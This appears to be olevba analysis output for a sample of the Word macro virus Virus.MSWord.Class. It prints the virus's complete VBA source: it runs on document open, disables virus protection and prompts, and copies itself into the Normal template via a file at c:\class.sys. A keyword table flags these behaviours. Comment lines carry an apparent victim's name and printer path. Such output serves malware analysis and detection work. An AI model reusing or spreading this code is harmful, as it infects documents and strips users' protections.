olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.bl-749bf51a76d53e7dbd35d06c2cf70e1eed95bb0a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.bl-749bf51a76d53e7dbd35d06c2cf70e1eed95bb0a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
On Error GoTo out
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
Options.VirusProtection = False
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
Options.SaveNormalPrompt = False
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
Options.ConfirmConversions = False
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
If nt > 70 And ad > 0 Then GoTo out
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
If nt < 70 Then
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
End If
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
host.codemodule.AddFromFile ("c:\class.sys")
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
With host.codemodule
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
    For x = 1 To 4
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
    .deletelines 1
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
    Next x
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
End With
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
If nt < 70 Then
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
    With host.codemodule
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
    .replaceline 1, "Sub AutoClose()"
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
    .replaceline 71, "Sub ToolsMacro()"
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
    End With
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
End If
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
With host.codemodule
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
    For x = 2 To 72 Step 2
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
    Next x
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
End With
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
out:
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
End Sub
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
Sub ViewVBCode()
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot
End Sub
'Akin Gump12/9/98 12:25:02 PMHP LaserJet 4000 (08@flsb) on \\PRINTER08@26FLSB@AKINLARobert Sanchez re SM/UCLA bill - 12/9/98The Dot

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

